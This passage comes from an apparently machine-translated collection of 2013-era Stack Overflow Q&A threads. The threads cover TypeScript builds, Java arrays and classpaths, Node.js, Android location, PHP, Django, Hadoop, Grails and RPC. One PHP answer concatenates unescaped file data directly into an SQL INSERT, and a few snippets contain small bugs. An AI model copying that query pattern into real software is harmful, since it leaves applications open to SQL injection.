1.  查找模型、服务、迁移文件夹和子文件夹中的所有 *.ts 文件
2.  将所有以前的文件添加到一个数组中，并添加参考文件
3.  用这样的命令运行 tsc.exe`tsc.exe --out <something>.core.js <previous_file_list>`

**为 UI 编译**

1.  在视图模型、描述符文件夹和子文件夹中查找所有 *.ts 文件
2.  将所有以前的文件添加到一个数组中，并添加参考文件
3.  用这样的命令运行 tsc.exe`tsc.exe --out <something>.ui.js <previous_file_list>`

现在我期待这会输出 2 个`my-app.core.js`仅包含核心文件的文件，以及一个`my-app.ui.js`仅包含 ui 文件的文件。然而，它们都包括一切......

现在考虑到这一点，这一定是由于引用，因为它们都*引用*了所有文件，但是在我看来这只是一个编译依赖，而不是需要用输出的 javascript 编译的东西。在 c#/java 中，您不会期望将引用的 dll/jar 编译到输出的 dll/jar 中，它只是一个必需的运行时依赖项。

我曾尝试拥有 2 个单独的参考文件，一个用于核心，一个用于 ui，但由于 ui 将取决于核心，因此我遇到了同样的问题，尽管至少这种方式`my-app.core.js`没有任何与 ui 相关的胡言乱语。

那么有没有办法获得引用但不将它们输出到生成的 javascript 文件中？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-09T13:14:21.190

您可以通过为 TypeScript 文件生成定义文件来完成此操作：

```
tsc --declaration FileName.ts 
```

在您的构建脚本中为每个 TypeScript 文件执行此操作，并使用生成的 FileName.d.ts 作为参考而不是 FileName.ts

我有以下文件：

```
-BusinessObjects
--Product.ts
--Customer.ts
--Order.ts
--BusinessObjects.d.ts 
```

**BusinessObjects.d.ts**如下所示：

```
/// <reference path="Customer.d.ts" />
/// <reference path="Order.d.ts" />
/// <reference path="Product.d.ts" /> 
```

对于 Product、Customer 和 Order，每个都有对 BusinessObjects.d.ts 的引用

当我运行时：

```
tsc --out combine.js Customer.ts Order.ts 
```

输出仅引用客户和订单，不包括产品。当我直接在我的 BusinessObjects.d.ts 文件中引用 *.ts 文件时，组合输出确实包含不需要的文件。

# java - java命令中的ClassNotFound异常

> ID：15899678
> 
> 赞同：1
> 
> 时间：2013-04-09T10:37:58.703
> 
> 标签：java, noclassdeffounderror, classnotfoundexception

我有简单的 Hello word 程序。当不在代码中声明命名空间时，程序将编译并运行，但是当我在命名空间中声明类并编译程序时，它将成功编译，但在该程序运行时会给出错误 classnotfound。我的问题是为什么 java 编译器在代码中声明命名空间（包）时无法找到类？

**请在下面找到源代码：**

```
package org;

public class Chunk
{

   public static void main(String [] args)
   {
    System.out.println("Hello, World");
   }
} 
```

**命令是**

```
java org.Chunk 
```

**错误是**

```
java.lang.NoClassDefFoundError: org/Chunk
Caused by: java.lang.ClassNotFoundException: org.Chunk
        at java.net.URLClassLoader$1.run(Unknown Source)
        at java.security.AccessController.doPrivileged(Native Method)
        at java.net.URLClassLoader.findClass(Unknown Source)
        at java.lang.ClassLoader.loadClass(Unknown Source)
        at sun.misc.Launcher$AppClassLoader.loadClass(Unknown Source)
        at java.lang.ClassLoader.loadClass(Unknown Source)
Could not find the main class: org.Chunk.  Program will exit.
Exception in thread "main" 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:40:58.707

您收到此错误可能是因为该类不是类路径的一部分。您可以使用 java 选项指定类路径`-cp`，以指向找到 org.Chunk 类的目录/jar。

# jquery-ui - jQuery可拖动：如何限制图像水平移动

> ID：15899680
> 
> 赞同：0
> 
> 时间：2013-04-09T10:37:59.953
> 
> 标签：jquery-ui

我已经使用 jquery draggable 做到了这一点。[演示](http://jsfiddle.net/roXon/hMmbK/2/)

```
$("img").draggable({ containment: [-99, -119, 0, 0], scroll: false }); 
```

如何获得图像可见部分的 x、y 值。

我想单击并拖动图像几次，当我移动光标时，图像正在移动，我不希望这种情况发生。

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:41:21.393

使用轴选项约束运动。{轴：“y”}

# node.js - 简单 NodeJS HTTP 代理上的 net.js 上的无限循环

> ID：15899687
> 
> 赞同：1
> 
> 时间：2013-04-09T10:38:11.373
> 
> 标签：node.js

我正在使用 NodeJS 制作一个手工制作的 HTTP 代理，但是当每秒有很多请求时，net.js 在读取空连接结束时进入无限循环。（它发生在 40 req/s 左右的随机方式）。

我分离了导致错误的代码，创建了一个引发问题的简单 HTTP 代理：

**代码**：[https ://gist.github.com/Ifnot/5336823](https://gist.github.com/Ifnot/5336823)

我使用命令“NODE_DEBUG=net node main.js”将 net.js 置于调试模式，即使所有连接似乎都已关闭，程序也会无限期地输出：

**调试**：[https ://gist.github.com/Ifnot/5274181](https://gist.github.com/Ifnot/5274181)

注意：当循环开始时，我可以看到这个错误：

```
(node) warning: possible EventEmitter memory leak detected. 11 listeners added. Use emitter.setMaxListeners() to increase limit.
Trace
    at Socket.EventEmitter.addListener (events.js:160:15)
    at Socket.Readable.on (_stream_readable.js:653:33)
    at Socket.EventEmitter.once (events.js:179:8)
    at TCP.onread (net.js:527:26) 
```

难道我做错了什么 ？有谁知道会发生什么？为什么会出现这个问题？

（我使用的是节点 v0.10.4，在之前的版本 v0.9.x 中发现了问题）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T18:23:28.490

这是来自 nodejs 核心的错误。我们在这里谈论：

[https://github.com/joyent/node/issues/5108](https://github.com/joyent/node/issues/5108)

版本后有bug `0.8.23`，解决方法是下载node版本编译`0.8.23`：

[http://blog.nodejs.org/2013/04/08/node-v0-8-23-legacy/](http://blog.nodejs.org/2013/04/08/node-v0-8-23-legacy/)

# android - Android 网络提供商，需要互联网吗？

> ID：15899693
> 
> 赞同：3
> 
> 时间：2013-04-09T10:38:20.800
> 
> 标签：android

我正在使用网络提供商进行位置更新。我的手机需要联网吗？

这是我的代码

```
LocationMngr = (LocationManager)getSystemService(Context.LOCATION_SERVICE);
LocationMngr.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, inteval, 0, this); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-01-10T09:35:57.803

我对看到其他人的答案感到困惑。然后我搜索了很多并对此有所了解。仅在搜索时，我了解了 A-GPS 的新概念。我想和你分享这些东西。

有`three`位置提供者。

```
1\. GPS Provider

2\. Network Provider (AGPS, CellID, WiFi MACID)

3\. Passive Provider. 
```

[注意：我从这个网站](https://stackoverflow.com/questions/6775257/android-location-providers-gps-or-network-provider)引用这个。当您提出与网络提供商相关的问题时，我将就此分享。

网络提供商，名称本身表示它需要网络连接。参考这篇[文章](http://javapapers.com/android/get-current-location-in-android/)。它需要**网络**或**WIFI**连接才能继续。

**全球定位系统**

手机上的 GPS 有点模糊。一般来说，打开手机的GPS不会花任何钱，但是当你得到一个位置时，它通常会涉及到手机公司，以便在没有信号的情况下快速得到它，以及在什么时候得到一个位置。卫星是不可见的（因为即使卫星在紧急 911 中不可见，政府也不需要修复）。它占用了一些蜂窝带宽。这也意味着对于没有常规 GPS 接收器的手机，如果您没有手机服务，则根本无法使用 GPS。

出于这个原因，大多数手机公司都关闭了手机中的 GPS，但紧急呼叫和他们向您出售的服务（例如方向）除外。

这种特殊类型的 GPS 称为`Assisted GPS`( **AGPS** )。

注意：即使手机支持，**网络不**支持也不行

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T10:43:39.340

无需 Internet 即可检索位置（GPS 或网络提供商）。使用 Internet 可以加快流程并为您提供更准确的位置（在与网络提供商打交道时）。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-04-09T10:39:23.793

不，GPS 传感器独立于互联网连接，因此如果您只想通过 GPS 获取您的位置，则无需担心互联网连接。我有一个带有 GPS 传感器的 Nexus 10，当我在没有互联网连接的情况下漫游时它工作得很好。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-04-09T10:46:00.227

不，您不需要互联网连接。但是在某些 rom 中，连接中可能存在一些错误。在 gps 模块中，您不需要互联网，但您可以通过某些方式使用 wifi 来提高性能，例如 google 导航服务。

# php - 逐行读取文件并在数据库行中保存一行

> ID：15899696
> 
> 赞同：-1
> 
> 时间：2013-04-09T10:38:32.937
> 
> 标签：php

我无法理解如何在数据库中保存一行...我有来自网络的文件，我用 CURL 带他。该文件如下所示：

www.example.com/file.txt

> REFALIAS http://.example.com/data/ */* * [http://example.com/data/?q=](http://example.com/data/?q=) $2
> 
> REFALIAS http://.example.com/data/ */* * [http://example.com/data/?q=](http://example.com/data/?q=) $2
> 
> REFALIAS http://.example.com/data/ */* * [http://example.com/data/?q=](http://example.com/data/?q=) $2
> 
> REFALIAS http://.example.com/data/ */* * [http://example.com/data/?q=](http://example.com/data/?q=) $2

我使用 CURL 获取来自网络的所有内容并保存在我的网络根目录中的新文件中......现在我对在数据库中保存行感到困惑。

我的 DB shema 如下所示：

```
ID  |   TYPE        |   LINK_ONE                      |  LINK_TWO
--------------------------------------------------------------------------------------
 1  |  REFALIAS     |  http://*.example.com/data/*/*  | http://example.com/data/?q=$2
 2  |  REFALIAS     |  http://*.example.com/data/*/*  | http://example.com/data/?q=$2
 3  |  REFALIAS     |  http://*.example.com/data/*/*  | http://example.com/data/?q=$2 
```

我试试这个：

```
<?php     
$fp = @fopen('myFile.txt', 'r');
    while(!feof($fp)) {
       $buffer = fwrite($fp, 999);
       list($type, $link_one, $link_two) = explode("\n", $buffer);
       mysql_query('INSERT INTO table ('type', 'link_one','link_two' VALUES("{$type}, {$link_one}, {$link_two}");
    }
?> 
```

本回公告：未定义偏移量：2；我尝试了很多这样的例子，但我无法将所有每一行都保存在数据库中。我必须逐行保存。我只用爆炸来取得成功，但如何将所有...

任何例子

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:52:05.997

试试这个代码：

```
<?php     
$fp = @fopen('myFile.txt', 'r');
    while(!feof($fp)) {
       $buffer = fgets($fp);
       if (empty($buffer)) continue;
       list($type, $link_one, $link_two) = explode(" ", $buffer);
       mysql_query('INSERT INTO table (`type`, `link_one`, `link_two`) VALUES(\'' . $type . '\', \'' . $link_one . '\', \'' . $link_two . '\')');
    }
?> 
```

# c# - 控件没有出现在设计模式（设计时）中？

> ID：15899698
> 
> 赞同：1
> 
> 时间：2013-04-09T10:38:38.253
> 
> 标签：c#, asp.net, visual-studio-2008, user-controls

我对特定用户控制有以下问题：

它显示为白色，并且 ( ) 中根本没有控件出现`design view`。( `design time`)

但来源：

```
<%@ Control Language="C#" AutoEventWireup="True" CodeBehind="Follow_New.ascx.cs"
    Inherits="DFUI.UserControls.Follow_New" %>
<%@ Register Assembly="AjaxControlToolkit" Namespace="AjaxControlToolkit" TagPrefix="cc1" %>
<%@ Register Assembly="MattBerseth.WebControls" Namespace="MattBerseth.WebControls"
    TagPrefix="mb" %>
<%@ Register Assembly="Telerik.Web.UI" Namespace="Telerik.Web.UI" TagPrefix="telerik" %>
.
.
.
.
. 
```

* * *

如何在设计视图中显示所有要编辑的控件而不是被源视图困扰，有什么问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-29T14:28:30.003

一种确保您的控件在设计视图中“可见”的方法，您可以像这样覆盖渲染：

```
 protected override void Render(System.Web.UI.HtmlTextWriter writer)
    {
        if (this.DesignMode)
        {
            //render control for designer...
            writer.Write(string.Format("<div>{0}</div>", this.ID));
        }
        else
        {
            //render actual control in runtime...
            base.Render(writer);
        }
    } 
```

要在设计器中启用控件编辑，您应该从 INamingContainer 继承，这是一个简单的演示：

```
[ToolboxData("<{0}:TabContainer runat=server></{0}:TabContainer>")]
[ParseChildren(ChildrenAsProperties = false)]
[PersistChildren(true)]
public class TabContainer : Panel, INamingContainer
{

    List<TabItem> tabs = new List<TabItem>();

    [Browsable(true)]
    [PersistenceMode(PersistenceMode.InnerProperty)]
    public List<TabItem> Tabs
    {
        get { return this.tabs; }
    }
}

public class TabItem : Panel, IPostBackEventHandler
{

    public event EventHandler Click;

} 
```

所以设计视图看起来像这样：

```
 <cc1:TabContainer ID="TabContainer1" runat="server">
            <Tabs>
                <cc1:TabItem ID="TabFirst" />
                <cc1:TabItem ID="TabSecond" />
            </Tabs>
        </cc1:TabContainer> 
```

希望这可以帮助！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-30T11:18:34.557

您是否检查了设计视图是否打开？转到选项 > 显示所有设置 > 滚动到 HTML 设计器 > 选择启用 HTML 设计器（需要重新启动 VS）

另一个原因可能是 HTML 损坏，打开你的 ASCX（不是后面的代码）然后按 `CTRL`+`K`然后`CTRL`+ `D`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-30T12:58:28.743

如果您试图让控件显示在工具箱中，您可能需要手动将您引用的 dll 添加到工具箱中。右键单击工具箱，然后浏览到您正在引用的 dll 的位置并选择您需要的那些。这将使任何正确标记的控件（以@gregor-primar 描述的方式标记）显示在工具箱中。

# java - 在java中向int []数组添加一个元素

> ID：15899699
> 
> 赞同：57
> 
> 时间：2013-04-09T10:38:40.543
> 
> 标签：java, arrays

想要向现有数组添加或追加元素

```
int[] series = {4,2}; 
```

现在我想用我发送的新值动态更新系列..

就像我发送 3 个更新系列一样`int[] series = {4,2,3};`

如果我再次发送 4 个更新系列`int[] series = {4,2,3,4};`

`int[] series = {4,2,3,4,1};`如果我再次发送1 个更新系列

怎么做？？？？

我在其他函数中每 5 分钟生成一个整数，并希望发送以更新`int[] series`数组..

* * *

## 回答 #1

> 赞同：89
> 
> 时间：2013-04-09T10:41:42.333

java中数组的长度是不可变的。这意味着一旦创建了数组，就无法更改数组的大小。如果你用 2 个元素初始化它，它的长度是 2。但是你可以使用不同的集合。

```
List<Integer> myList = new ArrayList<Integer>();
myList.add(5);
myList.add(7); 
```

并使用包装方法

```
public void addMember(Integer x) {
    myList.add(x);
}; 
```

* * *

## 回答 #2

> 赞同：56
> 
> 时间：2013-04-09T10:44:56.753

试试这个

```
public static void main(String[] args) {
    int[] series = {4,2};
    series = addElement(series, 3);
    series = addElement(series, 1);
}

static int[] addElement(int[] a, int e) {
    a  = Arrays.copyOf(a, a.length + 1);
    a[a.length - 1] = e;
    return a;
} 
```

* * *

## 回答 #3

> 赞同：14
> 
> 时间：2013-04-09T10:39:43.190

如果您每 5 分钟生成一个整数，最好使用集合。如果您的代码需要，您始终可以从中获取数组。

否则定义足够大的数组以在运行时处理所有值（虽然不是首选。）

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2013-12-08T04:07:32.987

如果要添加索引，则需要创建一个新数组。

试试这个：

```
public static void main(String[] args) {
    int[] series = new int[0];
    int x = 5;

    series = addInt(series, x);

    //print out the array with commas as delimiters
    System.out.print("New series: ");
    for (int i = 0; i < series.length; i++){
        if (i == series.length - 1){
            System.out.println(series[i]);
        }
        else{
            System.out.print(series[i] + ", ");
        }
    }
} 
```

// 这里，创建一个方法

```
public static int[] addInt(int [] series, int newInt){
    //create a new array with extra index
    int[] newSeries = new int[series.length + 1];

    //copy the integers from series to newSeries    
    for (int i = 0; i < series.length; i++){
        newSeries[i] = series[i];
    }
//add the new integer to the last index     
    newSeries[newSeries.length - 1] = newInt;

    return newSeries;

     } 
```

* * *

## 回答 #5

> 赞同：8
> 
> 时间：2014-09-05T10:06:18.867

像其他人建议你最好使用收集。但是，如果您出于某种原因必须坚持使用数组，那么 Apache Commons [ArrayUtils](https://commons.apache.org/proper/commons-lang/javadocs/api-2.6/org/apache/commons/lang/ArrayUtils.html)可能会有所帮助：

```
int[] series = {4,2};
series = ArrayUtils.add(series, 3); // series is now {4,2,3}
series = ArrayUtils.add(series, 4); // series is now {4,2,3,4}; 
```

请注意，该`add`方法创建一个新数组，复制给定数组并在末尾附加新元素，这可能会影响性能。

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2016-04-05T22:48:37.770

你也可以试试这个。

```
public static int[] addOneIntToArray(int[] initialArray , int newValue) {

    int[] newArray = new int[initialArray.length + 1];
    for (int index = 0; index < initialArray.length; index++) {
        newArray[index] = initialArray[index];
    }

    newArray[newArray.length - 1] = newValue;
    return newArray;
} 
```

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2013-04-09T10:40:29.210

数组的大小无法更改。如果你想要一个更大的数组，你必须创建一个新数组。

但是，更好的解决方案是使用可以根据需要增长的 (Array)List。如果您需要在应用程序中使用数组，则方法 ArrayList.toArray(T[] a) 返回一个数组。

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2015-05-11T07:26:41.930

```
public int[] return_Array() {

int[] a =new int[10];   
int b = 25;
for(int i=0; i<10; i++) {               
    a[i] = b * i;
    }
return a;

} 
```

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2013-04-09T10:59:28.210

```
import java.util.Arrays;

public class NumberArray {     

    public static void main(String []args){
        int[] series = {4,2};
        int[] newSeries = putNumberInSeries(1,series);
        System.out.println(series==newSeries);//return false. you won't get the same int[] object. But functionality achieved.
    }
    private static int[] putNumberInSeries(int i, int[] series) {
        int[] localSeries = Arrays.copyOf(series, series.length+1);
        localSeries[series.length] = i;
        System.out.println(localSeries);
        return localSeries;
    }
} 
```

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2015-05-22T00:21:34.853

`...`只能在 JDK 1.5 或更高版本中使用。如果您使用的是 JDK 4 或更低版本，请使用以下代码：'

```
public static int[] addElement(int[] original, int newelement) {
    int[] nEw = new int[original.length + 1];
    System.arraycopy(original, 0, nEw, 0, original.length);
    nEw[original.length] = newelement;
} 
```

否则（JDK 5 或更高版本）：

```
public static int[] addElement(int[] original, int... elements) { // This can add multiple elements at once; addElement(int[], int) will still work though.
    int[] nEw = new int[original.length + elements.length];
    System.arraycopy(original, 0, nEw, 0, original.length);
    System.arraycopy(elements, 0, nEw, original.length, elements.length);
    return nEw;
} 
```

当然，正如上面许多人提到的，您可以使用 a`Collection`或 an `ArrayList`，这允许您使用该`.add()`方法。

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2015-05-22T10:11:11.613

```
class AddElement {
     public static void main(String s[]) {
        int arr[] ={2,3};
        int add[] = new int[arr.length+1];
        for(int i=0;i<add.length;i++){
        if(i==add.length-1){
            add[i]=4;
        }else{
            add[i]=arr[i];
        }
        System.out.println(add[i]);
        }
    } 
} 
```

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2016-03-19T20:51:44.363

这对我有用：

```
int[] list = new int[maximum];
for (int i = 0; i < maximum; i++{
    list[i] = put_input_here;
} 
```

这样，它简单而高效。

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2013-12-03T03:22:00.417

类似于 Evgeniy：

```
int[] series = {4,2};

  add_element(3);
  add_element(4);
  add_element(1);

public void add_element(int element){
  series = Arrays.copyOf(series, series.length +1);
  series[series.length - 1] = element;
} 
```

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2015-05-11T07:43:38.510

int[] oldArray = {1,2,3,4,5};

```
 //new value
    int newValue = 10;

    //define the new array
    int[] newArray = new int[oldArray.length + 1];

    //copy values into new array
    for(int i=0;i < oldArray.length;i++)
        newArray[i] = oldArray[i];
    //another solution is to use 
    //System.arraycopy(oldArray, 0, newArray, 0, oldArray.length);

    //add new value to the new array
    newArray[newArray.length-1] = newValue;

    //copy the address to the old reference 
    //the old array values will be deleted by the Garbage Collector
    oldArray = newArray; 
```

# python - 优化两个 SQL 查询和一个列表推导

> ID：15899701
> 
> 赞同：1
> 
> 时间：2013-04-09T10:38:49.653
> 
> 标签：python, django, optimization

我有这两个模型（简化）：

```
class Place(OrderedModel):
    name = models.CharField(max_length=100)

class Team(models.Model):
    name = models.CharField(max_length=100)
    places = models.ManyToManyField(Place, blank=True) 
```

假设有 10 个实例`Place`。但只有五个实例`Team`。我想按中的条目顺序返回一个布尔值列表`Place`，其中`True`表示`Team.places`包含该位置并且`False`（显然）表示不包含该位置。该`Team.places`字段没有特定的顺序。

在下面的例子`Team`中，前四个`Place`对象的实例和最后一个在它的`places`字段中：

```
[True, True, True, True, False, False, False, False, False, True] 
```

我在 Team 模型上用这种方法解决了这个问题：

```
class Team(models.Model):
    ...
    def done(self):
        """
        Returns a list of Booleans, one for each place
        in order. True means that the team has found the
        place. False, that they have not.
        """
        places = Place.objects.all()
        return [p in self.places.all() for p in places] 
```

它有效，但似乎效率很低。它进行（我相信）两个不同的 SQL 查询，然后是列表理解。有没有更有效的方法来解决这个问题？

### 解决了

我最终这样做了：

```
def done(self):
    """
    Returns a list of Booleans, one for each place
    in order. True means that the team has found the
    place. False, that they have not.
    """
    sql = '''SELECT P.id, (TP.id IS NOT NULL) AS done
    FROM qrgame_place P
    LEFT OUTER JOIN qrgame_team_places TP
    ON P.id = TP.place_id AND TP.team_id = %s'''
    places = Place.objects.raw(sql, [self.id])
    for p in places:
        yield bool(p.done) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T11:35:56.023

你需要这个 SQL 查询：

```
SELECT P.id, (TP.id IS NOT NULL) AS done
FROM myapp_place P
LEFT OUTER JOIN myapp_team_places TP
ON P.id = TP.place_id AND TP.team_id = %s 
```

（您还需要添加一个`ORDER BY`子句以按您想要的顺序返回`Place`对象，但由于我看不到模型的那部分，我无法判断该子句应该是什么样子。）

我不知道如何使用 Django 的对象关系映射系统来表达这个查询，但你总是可以使用[原始 SQL 查询](https://docs.djangoproject.com/en/dev/topics/db/sql/)来运行它：

```
>>> sql = ''' ... as above ... '''
>>> places = Place.objects.raw(sql, [team.id])
>>> for p in places:
...     print p.id, bool(p.done)
...
1 True
2 True
3 False 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-09T14:29:00.860

一个更优化的解决方案是：

```
def done(self):    
    places = Place.objects.values_list('pk', flat=True)
    team_places = self.places.values_list('pk', flat=True)

    return [place in team_places for place in places] 
```

# hadoop - 如何在 context.write(k,v) 中输出值

> ID：15899705
> 
> 赞同：3
> 
> 时间：2013-04-09T10:39:05.367
> 
> 标签：hadoop, mapreduce, output

在我的 mapreduce 工作中，我只想输出一些行。

但如果我这样编码： context.write(data, null);

该程序将抛出 java.lang.NullPointerException。

我不想编写如下代码： context.write(data, new Text(""));

因为我必须修剪输出文件中每一行的空格。

有什么好的方法可以解决吗？提前致谢。

* * *

对不起，是我的错。我仔细检查了程序，发现原因是我将Reducer设置为combiner。

如果我不使用组合器，语句 context.write(data, null); 在减速机工作正常。在输出数据文件中，只有数据行。

* * *

分享 hadoop 权威指南中的 NullWritable 解释：

NullWritable 是 Writable 的一种特殊类型，因为它具有零长度序列化。没有字节被写入流或从流中读取。它用作占位符；例如，在 MapReduce 中，当您不需要使用该位置时，可以将键或值声明为 NullWritable——它有效地存储了一个常量空值。当您想要存储值列表时，NullWritable 也可以用作 SequenceFile 中的键，而不是键值对。它是一个不可变的单例：可以通过调用 NullWritable.get() 来检索实例。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-09T12:11:40.340

为此，您应该使用[NullWritable](http://hadoop.apache.org/docs/current/api/org/apache/hadoop/io/NullWritable.html)。

# c++ - 始终在标签栏中显示头文件的标签

> ID：15899706
> 
> 赞同：0
> 
> 时间：2013-04-09T10:39:06.863
> 
> 标签：c++, vim, tagbar

我正在使用带有标签栏插件的 vim，默认情况下标签栏显示当前活动缓冲区的标签。我很好奇是否有一个选项可以让它总是显示相应头文件的标签。因此，例如，如果当前缓冲区是*foo.cpp*我希望 tagbar 显示*foo.hpp*或*foo.h*的标签。标签栏中是否有这样的选项，或者我必须自己编码？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T11:03:14.083

在最新的 2.5 版本中，有一个`:TagbarTogglePause`命令允许您在编辑实现文件时查看标题标签（反之亦然）。您是否检查过文档-我认为没有提到您的功能？！

在任何情况下，您都应该在[插件的 GitHub 问题跟踪器上提交](https://github.com/majutsushi/tagbar/issues)增强请求，提出实施此请求，并与插件作者协调以增加您的补丁被接受的机会。

# asp.net-mvc-3 - 在 mvc3 中如何访问控制器中视图的 div 内部文本？

> ID：15899715
> 
> 赞同：-1
> 
> 时间：2013-04-09T10:39:30.620
> 
> 标签：asp.net-mvc-3

我有一个可编辑的 div。当我在单击一个按钮后编辑 div 时，如何访问控制器中的 div 内部文本...在控制器请求中 [""]...可能吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:44:46.923

很难正确理解您的问题，但如果您尝试在控制器中处理 div 的内容，ajax 将是您最好的朋友。您可以使用例如 jQuery 加载更改的 div 内容，然后发布到将处理它的控制器的操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T10:45:03.213

不，这是不可能的，因为`<div>`元素不是在提交元素时具有回传到服务器的值的输入元素`<form>`。你可以

1.  使用 a`<textarea>`或`<input type="text"/>`代替 a`<div>`
2.  在客户端使用 JavaScript 获取内部文本`<div>`并将值包含在提交给服务器的值中。

就个人而言，我会选择选项 1 并简单地将一个`<textarea>`“可编辑”放在里面`<div>`

# grails - 在grails中过滤带有偏移量的集合

> ID：15899719
> 
> 赞同：1
> 
> 时间：2013-04-09T10:39:40.540
> 
> 标签：grails, collections, dynamic-finders

我正在尝试使用 findAll 过滤 grails 中的集合，因此我只在他的字段“estado”中获取具有特定值的实例。
我有这样的事情：

```
trabajos.findAll({it.estado.equals( "Pago")}) 
```

问题是我不知道如何对返回的集合进行分页。
我查看了 grails 文档并找到了这个

```
Book.findAll(Map queryParams, Closure whereCriteria) 
```

但是当我尝试时

```
trabajos.findAll([offset: 0], {it.estado.equals("Pago")}) 
```

我得到以下异常

```
No signature of method: java.util.ArrayList.findAll() is applicable for argument types:       (java.util.LinkedHashMap, com.publidirecta.PersonalController$_show_closure2) values: [[offset:0], com.publidirecta.PersonalController$_show_closure2@a6bdb0] 
Possible solutions: findAll(), findAll(), findAll(groovy.lang.Closure), findAll(groovy.lang.Closure), find(), find()` 
```

这是为什么要实现某种分页这是为什么还是我必须手动完成？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:58:43.050

我猜你搞砸了两件事：grails 和 groovy。
`Book.findAll(Map queryParams, Closure whereCriteria)`- 是数据库中的查找器，它是 grails 的东西，您可以在其中传递最大参数。
但是在`trabajos.findAll({it.estado.equals( "Pago")})`你试图在列表中找到。很牛逼的事情。[在此处](http://groovy.codehaus.org/groovy-jdk/java/util/Collection.html)和[此处](http://groovy.codehaus.org/Collections)查看更多详细信息

如果您尝试从数据库中获取对象，请像这样使用

`Book.findAll(Map queryParams, Closure whereCriteria)`.

如果它是对象列表，请使用以下内容：

```
def filtered = trabajos.findAll({it.estado.equals( "Pago")})
def result = filteredList[offset..offset+max < filtered.size() ? offset+max : filtered.size()] 
```

# c++ - rpc 和普通 tcp/udp 服务器客户端程序的区别？

> ID：15899720
> 
> 赞同：4
> 
> 时间：2013-04-09T10:39:41.403
> 
> 标签：c++, tcp, udp, client-server, rpc

所以我一直在寻找不同的方法来创建客户端和服务器程序（使用 c++ 中的视觉工作室），我遇到了 RPC（远程过程调用）。但我注意到这也使用了 tcp/ip 或 udp 连接。

那么使用 RPC 与仅使用基本的 tcp/ip 或 udp 连接来连接客户端和服务器有什么区别？

代码完全不同，例如在 RCP 中使用 tcp：

```
 reinterpret_cast<unsigned char*>("ncacn_ip_tcp"), // Use TCP/IP protocol.
      reinterpret_cast<unsigned char*>("localhost"), // TCP/IP network address to use.
      reinterpret_cast<unsigned char*>("4747"), // TCP/IP port to use. 
```

但是在其他程序中（例如使用 WinSock）它需要更多的代码是不是比另一个更好？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-09T11:00:14.720

TCP/IP 和 UDP 是数据传输协议（从这里到那里获取数据包）。前者面向连接且可靠，而 UDP 无连接且不可靠。他们都不关心数据实际上是什么（文件、网页、视频等）。

TCP/IP 在两个端点之间创建*连接*，然后在一端发送的任何数据都会在另一端接收。

UDP没有连接的概念，它是一次性的“发送”，不保证交付。

几个更高级别的网络协议建立在 TCP/IP 和 UDP 之上。例如，HTTP（允许您查看此网页）。

RPC 是一种更高级别的协议，它允许一台计算机在另一台计算机上执行代码。您引用的代码行只是为该 RPC 实现设置配置参数。

简介： RPC 需要一个网络传输协议（如 TCP/IP）来完成它的工作，但是 RPC 是一个更高级别的协议，它完成的目的与仅仅从一台计算机发送非结构化数据到另一台计算机不同。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-09T11:00:15.553

你在谈论不同的概念。RPC 是机制，TCP/UDP - 通信方式。RPC 概念有很多不同语言的实现：[阅读 wiki](http://en.wikipedia.org/wiki/Remote_procedure_call)。TCP/UDP - 是传输。

因此，在您的情况下，“使用 TCP/UDP”意味着“基于 TCP/UDP 创建自己的 RPC”。我建议您阅读现有的 RPC 实现并根据您的任务选择最可接受的。

# cypher - 如何根据某些属性获取确切的节点

> ID：15899722
> 
> 赞同：0
> 
> 时间：2013-04-09T10:39:50.043
> 
> 标签：cypher, spring-data-neo4j

我正在创建一些节点和关系如下，请忽略变量名称约定：-

```
create e1={name:'sayeed', eId:1},   
p1={pId:101, is_flag1:'Y', is_flag2:'N', is_flag3:'Y'},    
p2={pId:102, is_flag1:'N', is_flag2:'N', is_flag3:'N'},   
p3={pId:103, is_flag1:'N', is_flag2:'Y', is_flag3:'N'},  
p1<-[:HAS_REL]-e1, p2<-[:HAS_REL]-e1, p3<-[:HAS_REL]-e1; 
```

并从此查询中搜索节点：

```
start e = node:node_auto_index('name:sayeed')  
match e-[:HOLD]-p
where p.is_flag2='N'  
return distinct e; 
```

上面的查询获取实体“e”，但在我的情况下它不应该得到。下面是详细说明。

我想获得具有“：HAS_REL”关系的实体，如果“is_flag2”中的任何一个是“Y”，所有“is_flag2”值都应该是“N”我不应该得到实体。请让我知道我该怎么写密码查询。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T19:50:05.970

你应该使用这个查询：

```
START e = node:node_auto_index('name:sayeed') 
MATCH e-[:HAS_REL]-p 
WHERE p.is_flag2='N' 
